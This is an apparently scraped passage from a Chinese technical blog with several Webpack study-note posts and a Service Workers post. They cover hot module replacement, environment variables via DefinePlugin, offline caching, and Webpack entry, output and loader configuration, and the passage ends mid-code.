不刷新浏览器能保留当前网页的运行状态，例如在使用 Redux 来管理数据的应用中搭配模块热替换能做到代码更新时 Redux 中的数据还保持不变。 总的来说模块热替换技术很大程度上的提高了开发效率和体验。 模块热替换的原理模块热替换的原理和自动刷新原理类似，都需要往要开发的网页中注入一个代理客户端用于连接 DevServer 和网页， 不同在于模块热替换独特的模块替换机制。 DevServer 默认不会开启模块热替换模式，要开启该模式，只需在启动时带上参数 –hot，完整命令是 webpack-dev-server –hot。 除了通过在启动时带上 –hot 参数，还可以通过接入 Plugin 实现，相关代码如下： const HotModuleReplacementPlugin = require(‘webpack/lib/HotModuleReplacementPlugin’); 1234567891011121314module.exports = &#123; entry:&#123; // 为每个入口都注入代理客户端 main:['webpack-dev-server/client?http://localhost:8080/', 'webpack/hot/dev-server','./src/main.js'], &#125;, plugins: [ // 该插件的作用就是实现模块热替换，实际上当启动时带上 `--hot` 参数，会注入该插件，生成 .hot-update.json 文件。 new HotModuleReplacementPlugin(), ], devServer:&#123; // 告诉 DevServer 要开启模块热替换模式 hot: true, &#125; &#125;; 在启动 Webpack 时带上参数 –hot 其实就是自动为你完成以上配置。 启动后日志如下： 12345678910111213141516171819202122232425&gt; webpack-dev-server --hotProject is running at http://localhost:8080/webpack output is served from /webpack: wait until bundle finished: /webpack: wait until bundle finished: /bundle.jsHash: fe62ac6b753c1d98961bVersion: webpack 3.5.5Time: 3563ms Asset Size Chunks Chunk Names bundle.js 1.11 MB 0 [emitted] [big] mainbundle.js.map 1.33 MB 0 [emitted] main [50] (webpack)/hot/log.js 1.04 kB &#123;0&#125; [built] [118] multi (webpack)-dev-server/client?http://localhost:8080 webpack/hot/dev-server ./main.js 52 bytes &#123;0&#125; [built] [119] (webpack)-dev-server/client?http://localhost:8080 5.83 kB &#123;0&#125; [built] [120] ./node_modules/url/url.js 23.3 kB &#123;0&#125; [built] [126] ./node_modules/strip-ansi/index.js 161 bytes &#123;0&#125; [built] [128] ./node_modules/loglevel/lib/loglevel.js 6.74 kB &#123;0&#125; [built] [129] (webpack)-dev-server/client/socket.js 856 bytes &#123;0&#125; [built] [161] (webpack)-dev-server/client/overlay.js 3.6 kB &#123;0&#125; [built] [166] (webpack)/hot nonrecursive ^\\.\\/log$ 170 bytes &#123;0&#125; [built] [168] (webpack)/hot/dev-server.js 1.61 kB &#123;0&#125; [built] [169] (webpack)/hot/log-apply-result.js 1.31 kB &#123;0&#125; [built] [170] ./main.js 2.35 kB &#123;0&#125; [built] + 262 hidden modules 可以看出 bundle.js 代理客户端相关的代码包含九个文件： 123456789[119] (webpack)-dev-server/client?http://localhost:8080 5.83 kB &#123;0&#125; [built][120] ./node_modules/url/url.js 23.3 kB &#123;0&#125; [built][126] ./node_modules/strip-ansi/index.js 161 bytes &#123;0&#125; [built][128] ./node_modules/loglevel/lib/loglevel.js 6.74 kB &#123;0&#125; [built] [129] (webpack)-dev-server/client/socket.js 856 bytes &#123;0&#125; [built][161] (webpack)-dev-server/client/overlay.js 3.6 kB &#123;0&#125; [built][166] (webpack)/hot nonrecursive ^\\.\\/log$ 170 bytes &#123;0&#125; [built][168] (webpack)/hot/dev-server.js 1.61 kB &#123;0&#125; [built][169] (webpack)/hot/log-apply-result.js 1.31 kB &#123;0&#125; [built] 相比于自动刷新的代理客户端，多出了后三个用于模块热替换的文件，也就是说代理客户端更大了。 修改源码 main.css 文件后，新输出了如下日志： 1234567891011121314webpack: Compiling...Hash: 18f81c959118f6230623Version: webpack 3.5.5Time: 551ms Asset Size Chunks Chunk Names bundle.js 1.11 MB 0 [emitted] [big] main 0.ea11a51f97f2b52bca7d.hot-update.js 353 bytes 0 [emitted] main ea11a51f97f2b52bca7d.hot-update.json 43 bytes [emitted] bundle.js.map 1.33 MB 0 [emitted] main0.ea11a51f97f2b52bca7d.hot-update.js.map 577 bytes 0 [emitted] main [68] ./node_modules/css-loader!./main.css 217 bytes &#123;0&#125; [built] [166] (webpack)/hot nonrecursive ^\\.\\/log$ 170 bytes &#123;0&#125; [built] + 275 hidden moduleswebpack: Compiled successfully. DevServer 新生成了一个用于替换老模块的补丁文件 0.ea11a51f97f2b52bca7d.hot-update.js，同时在浏览器开发工具中也能看到请求这个补丁的抓包： 可见补丁中包含了 main.css 文件新编译出来 CSS 代码，网页中的样式也立刻变成了源码中描述的那样。 但当你修改 main.js 文件时，会发现模块热替换没有生效，而是整个页面被刷新了，为什么修改 main.js 文件时会这样呢？ Webpack 为了让使用者在使用了模块热替换功能时能灵活地控制老模块被替换时的逻辑，可以在源码中定义一些代码去做相应的处理。 把main.js 文件改为如下： 12345678910111213141516import React from 'react';import &#123; render &#125; from 'react-dom';import &#123; AppComponent &#125; from './AppComponent';import './main.css';render(&lt;AppComponent/&gt;, window.document.getElementById('app'));// 只有当开启了模块热替换时 module.hot 才存在if (module.hot) &#123; // accept 函数的第一个参数指出当前文件接受哪些子模块的替换，这里表示只接受 ./AppComponent 这个子模块 // 第2个参数用于在新的子模块加载完毕后需要执行的逻辑 module.hot.accept(['./AppComponent'], () =&gt; &#123; // 新的 AppComponent 加载成功后重新执行下组建渲染逻辑 render(&lt;AppComponent/&gt;, window.document.getElementById('app')); &#125;);&#125; 其中的 module.hot 是当开启模块热替换后注入到全局的 API，用于控制模块热替换的逻辑。 现在修改 AppComponent.js 文件，把 Hello,Webpack 改成 Hello,World，你会发现模块热替换生效了。 但是当你编辑 main.js 时，你会发现整个网页被刷新了。为什么修改这两个文件会有不一样的表现呢？ 当子模块发生更新时，更新事件会一层层往上传递，也就是从 AppComponent.js 文件传递到 main.js 文件， 直到有某层的文件接受了当前变化的模块，也就是 main.js 文件中定义的 module.hot.accept([‘./AppComponent’], callback)， 这时就会调用 callback 函数去执行自定义逻辑。如果事件一直往上抛到最外层都没有文件接受它，就会直接刷新网页。 那为什么没有地方接受过 .css 文件，但是修改所有的 .css 文件都会触发模块热替换呢？ 原因在于 style-loader 会注入用于接受 CSS 的代码。 请不要把模块热替换技术用于线上环境，它是专门为提升开发效率而生的。 优化模块热替换在发生模块热替换时，你会在浏览器的控制台中看到类似这样的日志： 其中的 Updated modules: 68 是指 ID 为68的模块被替换了，这对开发者来说很不友好，因为开发者不知道 ID 和模块之间的对应关系，最好是把替换了的模块的名称输出出来。 Webpack 内置的 NamedModulesPlugin 插件可以解决该问题，修改 Webpack 配置文件接入该插件： 12345678const NamedModulesPlugin = require('webpack/lib/NamedModulesPlugin');module.exports = &#123; plugins: [ // 显示出被替换模块的名称 new NamedModulesPlugin(), ],&#125;; 重启构建后你会发现浏览器中的日志更加友好了： 除此之外，模块热替换还面临着和自动刷新一样的性能问题，因为它们都需要监听文件变化和注入客户端。 要优化模块热替换的构建性能，思路和在4-5 使用自动刷新中提到的很类似：监听更少的文件，忽略掉 node_modules 目录下的文件。 但是其中提到的关闭默认的 inline 模式手动注入代理客户端的优化方法不能用于在使用模块热替换的情况下， 原因在于模块热替换的运行依赖在每个 Chunk 中都包含代理客户端的代码。 区分环境为什么需要区分环境在开发网页的时候，一般都会有多套运行环境，例如： 在开发过程中方便开发调试的环境。 发布到线上给用户使用的运行环境。 这两套不同的环境虽然都是由同一套源代码编译而来，但是代码内容却不一样，差异包括： 线上代码被通过 4-8 压缩代码 中提到的方法压缩过。 开发用的代码包含一些用于提示开发者的提示日志，这些日志普通用户不可能去看它。 开发用的代码所连接的后端数据接口地址也可能和线上环境不同，因为要避免开发过程中造成对线上数据的影响。 为了尽可能的复用代码，在构建的过程中需要根据目标代码要运行的环境而输出不同的代码，我们需要一套机制在源码中去区分环境。 幸运的是 Webpack 已经为我们实现了这点。 如何区分环境具体区分方法很简单，在源码中通过如下方式： 12345if (process.env.NODE_ENV === 'production') &#123; console.log('你正在线上环境');&#125; else &#123; console.log('你正在使用开发环境');&#125; 其大概原理是借助于环境变量的值去判断执行哪个分支。 当你的代码中出现了使用 process 模块的语句时，Webpack 就自动打包进 process 模块的代码以支持非 Node.js 的运行环境。 当你的代码中没有使用 process 时就不会打包进 process 模块的代码。这个注入的 process 模块作用是为了模拟 Node.js 中的 process，以支持上面使用的 process.env.NODE_ENV === ‘production’ 语句。 在构建线上环境代码时，需要给当前运行环境设置环境变量 NODE_ENV = ‘production’，Webpack 相关配置如下： 123456789101112const DefinePlugin = require('webpack/lib/DefinePlugin');module.exports = &#123; plugins: [ new DefinePlugin(&#123; // 定义 NODE_ENV 环境变量为 production 'process.env': &#123; NODE_ENV: JSON.stringify('production') &#125; &#125;), ],&#125;; 注意在定义环境变量的值时用 JSON.stringify 包裹字符串的原因是环境变量的值需要是一个由双引号包裹的字符串，而 JSON.stringify(‘production’)的值正好等于’”production”‘。 执行构建后，你会在输出的文件中发现如下代码： 12345if (true) &#123; console.log('你正在使用线上环境');&#125; else &#123; console.log('你正在使用开发环境');&#125; 定义的环境变量的值被代入到了源码中，process.env.NODE_ENV === ‘production’ 被直接替换成了 true。 并且由于此时访问 process 的语句被替换了而没有了，Webpack 也不会打包进 process 模块了。 DefinePlugin 定义的环境变量只对 Webpack 需要处理的代码有效，而不会影响 Node.js 运行时的环境变量的值。 通过 Shell 脚本的方式去定义的环境变量，例如 NODE_ENV=production webpack，Webpack 是不认识的，对 Webpack 需要处理的代码中的环境区分语句是没有作用的。 也就是说只需要通过 DefinePlugin 定义环境变量就能使上面介绍的环境区分语句正常工作，没必要又通过 Shell 脚本的方式去定义一遍。 如果你想让 Webpack 使用通过 Shell 脚本的方式去定义的环境变量，你可以使用 EnvironmentPlugin，代码如下： 123456new webpack.EnvironmentPlugin(['NODE_ENV'])以上这句代码实际上等价于：new webpack.DefinePlugin(&#123; 'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV),&#125;) 结合 UglifyJS其实以上输出的代码还可以进一步优化，因为 if(true) 语句永远只会执行前一个分支中的代码，也就是说最佳的输出其实应该直接是： 1console.log('你正在线上环境'); Webpack 没有实现去除死代码功能，但是 UglifyJS 可以做这个事情，如何使用请阅读 4-8 压缩代码 中的压缩 JavaScript。 第三方库中的环境区分除了在自己写的源码中可以有环境区分的代码外，很多第三方库也做了环境区分的优化。 以 React 为例，它做了两套环境区分，分别是： 开发环境：包含类型检查、HTML 元素检查等等针对开发者的警告日志代码。 线上环境：去掉了所有针对开发者的代码，只保留让 React 能正常运行的部分，以优化大小和性能。例如 React 源码中有大量类似下面这样的代码： 123if (process.env.NODE_ENV !== 'production') &#123; warning(false, '%s(...): Can only update a mounted or mounting component.... ')&#125; 如果你不定义 NODE_ENV=production 那么这些警告日志就会被包含到输出的代码中，输出的文件将会非常大。 process.env.NODE_ENV !== ‘production’ 中的 NODE_ENV 和 ‘production’ 两个值是社区的约定，通常使用这条判断语句在区分开发环境和线上环境。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"webpack","slug":"技术/前端/webpack","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/webpack/"}],"tags":[]},{"title":"从Service-Workers认识离线应用","slug":"从Service-Workers认识离线应用","date":"2020-07-29T16:00:00.000Z","updated":"2024-05-25T02:28:45.261Z","comments":true,"path":"2020/07/30/从Service-Workers认识离线应用/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/30/%E4%BB%8EService-Workers%E8%AE%A4%E8%AF%86%E7%A6%BB%E7%BA%BF%E5%BA%94%E7%94%A8/","excerpt":"认识离线应用你的网页性能优化的再好，如果网络不好那也会导致网页的体验差。 离线应用是指通过离线缓存技术，让资源在第一次被加载后缓存在本地，下次访问它时就直接返回本地的文件，就算没有网络连接。 离线应用有以下优点： 在没有网络的情况下也能打开网页。 由于部分被缓存的资源直接从本地加载，对用户来说可以加速网页加载速度，对网站运营者来说可以减少服务器压力以及传输流量费用。 离线应用的核心是离线缓存技术，历史上曾先后出现2种离线离线缓存技术，它们分别是： AppCache 又叫 Application Cache，目前已经从 Web 标准中删除，请尽量不要使用它。 Service Workers 是目前最新的离线缓存技术，是 Web Worker 的一部分。 它通过拦截网络请求实现离线缓存，比 AppCache 更加灵活。它也是构建 PWA 应用的关键技术之一。 Service Workers 相比于 AppCache 来说更加灵活，因为它可以通过 JavaScript 代码去控制缓存的逻辑。","text":"认识离线应用你的网页性能优化的再好，如果网络不好那也会导致网页的体验差。 离线应用是指通过离线缓存技术，让资源在第一次被加载后缓存在本地，下次访问它时就直接返回本地的文件，就算没有网络连接。 离线应用有以下优点： 在没有网络的情况下也能打开网页。 由于部分被缓存的资源直接从本地加载，对用户来说可以加速网页加载速度，对网站运营者来说可以减少服务器压力以及传输流量费用。 离线应用的核心是离线缓存技术，历史上曾先后出现2种离线离线缓存技术，它们分别是： AppCache 又叫 Application Cache，目前已经从 Web 标准中删除，请尽量不要使用它。 Service Workers 是目前最新的离线缓存技术，是 Web Worker 的一部分。 它通过拦截网络请求实现离线缓存，比 AppCache 更加灵活。它也是构建 PWA 应用的关键技术之一。 Service Workers 相比于 AppCache 来说更加灵活，因为它可以通过 JavaScript 代码去控制缓存的逻辑。 认识 Service WorkersService Workers 是一个在浏览器后台运行的脚本，它生命周期完全独立于网页。它无法直接访问 DOM，但可以通过 postMessage 接口发送消息来和 UI 进程通信。 拦截网络请求是 Service Workers 的一个重要功能，通过它能完成离线缓存、编辑响应、过滤响应等功能。 想更深入的了解 Service Workers，推荐阅读文章服务工作线程：简介。 Service Workers 兼容性目前 Chrome、Firefox、Opera 都已经全面支持 Service Workers，但对于移动端浏览器就不太乐观了，只有高版本的 Android 支持。 由于 Service Workers 无法通过注入 polyfill 去实现兼容，所以在你打算使用它前请先调查清楚你的网页的运行场景。 判断浏览器是否支持 Service Workers 的最简单的方法是通过以下代码： 1234// 如果 navigator 对象上存在 serviceWorker 对象，就表示支持if (navigator.serviceWorker) &#123; // 通过 navigator.serviceWorker 使用&#125; 注册 Service Workers要给网页接入 Service Workers，需要在网页加载后注册一个描述 Service Workers 逻辑的脚本。 代码如下： 123456if (navigator.serviceWorker) &#123; window.addEventListener('DOMContentLoaded',function() &#123; // 调用 serviceWorker.register 注册，参数 /sw.js 为脚本文件所在的 URL 路径 navigator.serviceWorker.register('/sw.js'); &#125;);&#125; 一旦这个脚本文件被加载，Service Workers 的安装就开始了。这个脚本被安装到浏览器中后，就算用户关闭了当前网页，它仍会存在。 也就是说第一次打开该网页时 Service Workers 的逻辑不会生效，因为脚本还没有被加载和注册，但是以后再次打开该网页时脚本里的逻辑将会生效。 在 Chrome 中可以通过打开网址 chrome://inspect/#service-workers 来查看当前浏览器中所有注册了的 Service Workers。 使用 Service Workers 实现离线缓存Service Workers 在注册成功后会在其生命周期中派发出一些事件，通过监听对应的事件在特点的时间节点上做一些事情。 在 Service Workers 脚本中，引入了新的关键字 self 代表当前的 Service Workers 实例。 在 Service Workers 安装成功后会派发出 install 事件，需要在这个事件中执行缓存资源的逻辑，实现代码如下： 1234567891011121314151617181920// 当前缓存版本的唯一标识符，用当前时间代替var cacheKey = new Date().toISOString();// 需要被缓存的文件的 URL 列表var cacheFileList = [ '/index.html', '/app.js', '/app.css'];// 监听 install 事件self.addEventListener('install', function (event) &#123; // 等待所有资源缓存完成时，才可以进行下一步 event.waitUntil( caches.open(cacheKey).then(function (cache) &#123; // 要缓存的文件 URL 列表 return cache.addAll(cacheFileList); &#125;) );&#125;); 接下来需要监听网络请求事件去拦截请求，复用缓存，代码如下： 1234567891011121314self.addEventListener('fetch', function(event) &#123; event.respondWith( // 去缓存中查询对应的请求 caches.match(event.request).then(function(response) &#123; // 如果命中本地缓存，就直接返回本地的资源 if (response) &#123; return response; &#125; // 否则就去用 fetch 下载资源 return fetch(event.request); &#125; ) );&#125;); 以上就实现了离线缓存。 更新缓存线上的代码有时需要更新和重新发布，如果这个文件被离线缓存了，那就需要 Service Workers 脚本中有对应的逻辑去更新缓存。 这可以通过更新 Service Workers 脚本文件做到。 浏览器针对 Service Workers 有如下机制： 每次打开接入了 Service Workers 的网页时，浏览器都会去重新下载 Service Workers 脚本文件（所以要注意该脚本文件不能太大），如果发现和当前已经注册过的文件存在字节差异，就将其视为“新服务工作线程”。 新 Service Workers 线程将会启动，且将会触发其 install 事件。当网站上当前打开的页面关闭时，旧 Service Workers 线程将会被终止，新 Service Workers 线程将会取得控制权。新 Service Workers 线程取得控制权后，将会触发其 activate 事件。新 Service Workers 线程中的 activate 事件就是最佳的清理旧缓存的时间点，代码如下： 123456789101112131415161718// 当前缓存白名单，在新脚本的 install 事件里将使用白名单里的 key var cacheWhitelist = [cacheKey];self.addEventListener('activate', function(event) &#123; event.waitUntil( caches.keys().then(function(cacheNames) &#123; return Promise.all( cacheNames.map(function(cacheName) &#123; // 不在白名单的缓存全部清理掉 if (cacheWhitelist.indexOf(cacheName) === -1) &#123; // 删除缓存 return caches.delete(cacheName); &#125; &#125;) ); &#125;) );&#125;); 最终完整的代码 Service Workers 脚本代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 当前缓存版本的唯一标识符，用当前时间代替var cacheKey = new Date().toISOString();// 当前缓存白名单，在新脚本的 install 事件里将使用白名单里的 keyvar cacheWhitelist = [cacheKey];// 需要被缓存的文件的 URL 列表var cacheFileList = [ '/index.html', 'app.js', 'app.css'];// 监听 install 事件self.addEventListener('install', function (event) &#123; // 等待所有资源缓存完成时，才可以进行下一步 event.waitUntil( caches.open(cacheKey).then(function (cache) &#123; // 要缓存的文件 URL 列表 return cache.addAll(cacheFileList); &#125;) );&#125;);// 拦截网络请求self.addEventListener('fetch', function (event) &#123; event.respondWith( // 去缓存中查询对应的请求 caches.match(event.request).then(function (response) &#123; // 如果命中本地缓存，就直接返回本地的资源 if (response) &#123; return response; &#125; // 否则就去用 fetch 下载资源 return fetch(event.request); &#125; ) );&#125;);// 新 Service Workers 线程取得控制权后，将会触发其 activate 事件self.addEventListener('activate', function (event) &#123; event.waitUntil( caches.keys().then(function (cacheNames) &#123; return Promise.all( cacheNames.map(function (cacheName) &#123; // 不在白名单的缓存全部清理掉 if (cacheWhitelist.indexOf(cacheName) === -1) &#123; // 删除缓存 return caches.delete(cacheName); &#125; &#125;) ); &#125;) );&#125;);","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"深入浅出-Webpack学习笔记（二）","slug":"深入浅出-Webpack学习笔记（二）","date":"2020-07-29T16:00:00.000Z","updated":"2024-05-25T04:21:29.340Z","comments":true,"path":"2020/07/30/深入浅出-Webpack学习笔记（二）/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/30/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-Webpack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"配置 Webpack 的方式有两种： 通过一个 JavaScript 文件描述配置，例如使用 webpack.config.js 文件里的配置； 执行 Webpack 可执行文件时通过命令行参数传入，例如 webpack –devtool source-map。 这两种方式可以相互搭配，例如执行 Webpack 时通过命令 webpack –config webpack-dev.config.js 指定配置文件，再去 webpack-dev.config.js 文件里描述部分配置。 按照配置方式来划分，可分为： 只能通过命令行参数传入的选项，这种最为少见； 只能通过配置文件配置的选项； 通过两种方式都可以配置的选项。","text":"配置 Webpack 的方式有两种： 通过一个 JavaScript 文件描述配置，例如使用 webpack.config.js 文件里的配置； 执行 Webpack 可执行文件时通过命令行参数传入，例如 webpack –devtool source-map。 这两种方式可以相互搭配，例如执行 Webpack 时通过命令 webpack –config webpack-dev.config.js 指定配置文件，再去 webpack-dev.config.js 文件里描述部分配置。 按照配置方式来划分，可分为： 只能通过命令行参数传入的选项，这种最为少见； 只能通过配置文件配置的选项； 通过两种方式都可以配置的选项。 以vueJs举例，vue-cli脚手架搭建的项目开发者几乎感受不到webpack的存在，因为脚手架工具已经为我们做好了最佳的配置，就算有一些个性化的配置需求，我们也只需要在vue.config.js中进行这样的配置： 123456789module.exports = &#123; configureWebpack: &#123; resolve: &#123; alias: &#123; '@': path.join(__dirname, 'src'), &#125;, &#125;, &#125;,&#125;; 最终vue会将这个配置合并到webpack的配置文件当中，开发者不会直接接触并操作webpack的配置文件 但是现在由于学习需要，我们可以导出vue的webpack配置文件，方便我们理解webpack各个配置项，在对比的过程中深入理解各个配置的作用。 在vue项目的根目录下面执行： 1vue inspect &gt; output.js 这样在根目录下就会出现一个output.js文件，这就是当前vue项目的webpack相关配置。 Entry的配置entry是配置模块的入口，可抽象成输入，Webpack 执行构建的第一步将从入口开始搜寻及递归解析出所有入口依赖的模块。 entry 配置是必填的，若不填则将导致 Webpack 报错退出。 contextWebpack 在寻找相对路径的文件时会以 context 为根目录，context 默认为执行启动 Webpack 时所在的当前工作目录。 如果想改变 context 的默认配置，则可以在配置文件里这样设置它： 123module.exports = &#123; context: path.resolve(__dirname, 'app')&#125; 注意， context 必须是一个绝对路径的字符串。 除此之外，还可以通过在启动 Webpack 时带上参数 webpack –context 来设置 context。 之所以在这里先介绍 context，是因为 Entry 的路径和其依赖的模块的路径可能采用相对于 context 的路径来描述，context 会影响到这些相对路径所指向的真实文件。 Entry 类型Entry 类型可以是以下三种中的一种或者相互组合： 如果是 array 类型，则搭配 output.library 配置项使用时，只有数组里的最后一个入口文件的模块会被导出。 Chunk 名称Webpack 会为每个生成的 Chunk 取一个名称，Chunk 的名称和 Entry 的配置有关： 如果 entry 是一个 string 或 array，就只会生成一个 Chunk，这时 Chunk 的名称是 main； 如果 entry 是一个 object，就可能会出现多个 Chunk，这时 Chunk 的名称是 object 键值对里键的名称。 配置动态 Entry假如项目里有多个页面需要为每个页面的入口配置一个 Entry ，但这些页面的数量可能会不断增长，则这时 Entry 的配置会受到到其他因素的影响导致不能写成静态的值。其解决方法是把 Entry 设置成一个函数去动态返回上面所说的配置，代码如下： 12345678910111213141516// 同步函数entry: () =&gt; &#123; return &#123; a:'./pages/a', b:'./pages/b', &#125;&#125;;// 异步函数entry: () =&gt; &#123; return new Promise((resolve)=&gt;&#123; resolve(&#123; a:'./pages/a', b:'./pages/b', &#125;); &#125;);&#125;; Output配置output 配置如何输出最终想要的代码。output 是一个 object，里面包含一系列配置项，下面分别介绍它们。 filenameoutput.filename 配置输出文件的名称，为string 类型。 如果只有一个输出文件，则可以把它写成静态不变的： 1filename: 'bundle.js' 但是在有多个 Chunk 要输出时，就需要借助模版和变量了。前面说到 Webpack 会为每个 Chunk取一个名称，可以根据 Chunk 的名称来区分输出的文件名： 1filename: '[name].js' 代码里的 [name] 代表用内置的 name 变量去替换[name]，这时你可以把它看作一个字符串模块函数， 每个要输出的 Chunk 都会通过这个函数去拼接出输出的文件名称。 内置变量除了 name 还包括： 变量名 含义 id Chunk 的唯一标识，从0开始 name Chunk 的名称 hash Chunk 的唯一标识的 Hash 值 chunkhash Chunk 内容的 Hash 值其中 hash 和 chunkhash 的长度是可指定的，[hash:8] 代表取8位 Hash 值，默认是20位。 注意 ExtractTextWebpackPlugin 插件是使用 contenthash 来代表哈希值而不是 chunkhash，原因在于 ExtractTextWebpackPlugin 提取出来的内容是代码内容本身而不是由一组模块组成的 Chunk。 chunkFilenameoutput.chunkFilename 配置无入口的 Chunk 在输出时的文件名称。 chunkFilename 和上面的 filename 非常类似，但 chunkFilename 只用于指定在运行过程中生成的 Chunk 在输出时的文件名称。 常见的会在运行时生成 Chunk 场景有在使用 CommonChunkPlugin、使用 import(‘path/to/module’) 动态加载等时。 chunkFilename 支持和 filename 一致的内置变量。 pathoutput.path 配置输出文件存放在本地的目录，必须是 string 类型的绝对路径。通常通过 Node.js 的 path 模块去获取绝对路径： 1path: path.resolve(__dirname, 'dist_[hash]') publicPath在复杂的项目里可能会有一些构建出的资源需要异步加载，加载这些异步资源需要对应的 URL 地址。 output.publicPath 配置发布到线上资源的 URL 前缀，为string 类型。 默认值是空字符串 ‘’，即使用相对路径。 这样说可能有点抽象，举个例子，需要把构建出的资源文件上传到 CDN 服务上，以利于加快页面的打开速度。配置代码如下： 12filename:'[name]_[chunkhash:8].js'publicPath: 'https://cdn.example.com/images/assets/' 这时发布到线上的 HTML 在引入 JavaScript 文件时就需要： 1&lt;script src='https://cdn.example.com/images/assets/a_12345678.js'&gt;&lt;/script&gt; 使用该配置项时要小心，稍有不慎将导致资源加载404错误。 当项目里使用了一些静态资源文件，比如图片啥的，为了防止打包后资源加载出错也需要设置这一项，将路径设置为打包完成后静态资源存放的目录 output.path 和 output.publicPath 都支持字符串模版，内置变量只有一个：hash 代表一次编译操作的 Hash 值。 crossOriginLoadingWebpack 输出的部分代码块可能需要异步加载，而异步加载是通过 JSONP 方式实现的。 JSONP 的原理是动态地向 HTML 中插入一个 &lt;script src=&quot;url&quot;&gt;&lt;/script&gt;标签去加载异步资源。 output.crossOriginLoading 则是用于配置这个异步插入的标签的 crossorigin 值。 script 标签的 crossorigin 属性可以取以下值： anonymous(默认) 在加载此脚本资源时不会带上用户的 Cookies； use-credentials 在加载此脚本资源时会带上用户的 Cookies。 通常用设置 crossorigin 来获取异步加载的脚本执行时的详细错误信息。 libraryTarget 和 library当用 Webpack 去构建一个可以被其他模块导入使用的库时需要用到它们。 output.libraryTarget 配置以何种方式导出库。 output.library 配置导出库的名称。 它们通常搭配在一起使用。 output.libraryTarget 是字符串的枚举类型，支持以下配置。 var (默认)编写的库将通过 var 被赋值给通过 library 指定名称的变量。 假如配置了 output.library=’LibraryName’，则输出和使用的代码如下： 12345// Webpack 输出的代码var LibraryName = lib_code;// 使用库的方法LibraryName.doSomething(); 假如 output.library 为空，则将直接输出：lib_code 其中 lib_code 代指导出库的代码内容，是有返回值的一个自执行函数。 commonjs编写的库将通过 CommonJS 规范导出。 假如配置了 output.library=’LibraryName’，则输出和使用的代码如下： 12345// Webpack 输出的代码exports['LibraryName'] = lib_code;// 使用库的方法require('library-name-in-npm')['LibraryName'].doSomething(); 其中 library-name-in-npm 是指模块发布到 Npm 代码仓库时的名称。 commonjs2编写的库将通过 CommonJS2 规范导出，输出和使用的代码如下： 12345// Webpack 输出的代码module.exports = lib_code;// 使用库的方法require('library-name-in-npm').doSomething(); CommonJS2 和 CommonJS 规范很相似，差别在于 CommonJS 只能用 exports 导出，而 CommonJS2 在 CommonJS 的基础上增加了 module.exports 的导出方式。 在 output.libraryTarget 为 commonjs2 时，配置 output.library 将没有意义。 this编写的库将通过 this 被赋值给通过 library 指定的名称，输出和使用的代码如下： 12345// Webpack 输出的代码this['LibraryName'] = lib_code;// 使用库的方法this.LibraryName.doSomething(); window编写的库将通过 window 被赋值给通过 library 指定的名称，即把库挂载到 window 上，输出和使用的代码如下： 12345// Webpack 输出的代码window['LibraryName'] = lib_code;// 使用库的方法window.LibraryName.doSomething(); global编写的库将通过 global 被赋值给通过 library 指定的名称，即把库挂载到 global 上，输出和使用的代码如下： 12345// Webpack 输出的代码global['LibraryName'] = lib_code;// 使用库的方法global.LibraryName.doSomething(); libraryExportoutput.libraryExport 配置要导出的模块中哪些子模块需要被导出。 它只有在 output.libraryTarget 被设置成 commonjs 或者 commonjs2 时使用才有意义。 假如要导出的模块源代码是： 12export const a=1;export default b=2; 现在你想让构建输出的代码只导出其中的 a，可以把 output.libraryExport 设置成 a，那么构建输出的代码和使用方法将变成如下： 12345// Webpack 输出的代码module.exports = lib_code['a'];// 使用库的方法require('library-name-in-npm')===1; Module配置配置如何处理模块 配置 Loaderrules 配置模块的读取和解析规则，通常用来配置 Loader。其类型是一个数组，数组里每一项都描述了如何去处理部分文件。 配置一项 rules 时大致通过以下方式： 条件匹配：通过 test 、 include 、 exclude 三个配置项来命中 Loader 要应用规则的文件。 应用规则：对选中后的文件通过 use 配置项来应用 Loader，可以只应用一个 Loader 或者按照从后往前的顺序应用一组 Loader，同时还可以分别给 Loader 传入参数。 重置顺序：一组 Loader 的执行顺序默认是从右到左执行，通过 enforce 选项可以让其中一个 Loader 的执行顺序放到最前或者最后。 下面来通过一个例子来说明具体使用方法： 123456789101112131415161718192021222324252627module: &#123; rules: [ &#123; // 命中 JavaScript 文件 test: /\\.js$/, // 用 babel-loader 转换 JavaScript 文件 // ?cacheDirectory 表示传给 babel-loader 的参数，用于缓存 babel 编译结果加快重新编译速度 use: ['babel-loader?cacheDirectory'], // 只命中src目录里的js文件，加快 Webpack 搜索速度 include: path.resolve(__dirname, 'src') &#125;, &#123; // 命中 SCSS 文件 test: /\\.scss$/, // 使用一组 Loader 去处理 SCSS 文件。 // 处理顺序为从后到前，即先交给 sass-loader 处理，再把结果交给 css-loader 最后再给 style-loader。 use: ['style-loader', 'css-loader', 'sass-loader'], // 排除 node_modules 目录下的文件 exclude: path.resolve(__dirname, 'node_modules'), &#125;, &#123; // 对非文本文件采用 file-loader 加载 test: /\\.(gif|png|jpe?g|eot|woff|ttf|svg|pdf)$/, use: ['file-loader'], &#125;, ]&#125; 在 Loader 需要传入很多参数时，你还可以通过一个 Object 来描述，例如在上面的 babel-loader 配置中有如下代码： 123456789101112use: [ &#123; loader:'babel-loader', options:&#123; cacheDirectory:true, &#125;, // enforce:'post' 的含义是把该 Loader 的执行顺序放到最后 // enforce 的值还可以是 pre，代表把 Loader 的执行顺序放到最前面 enforce:'post' &#125;, // 省略其它 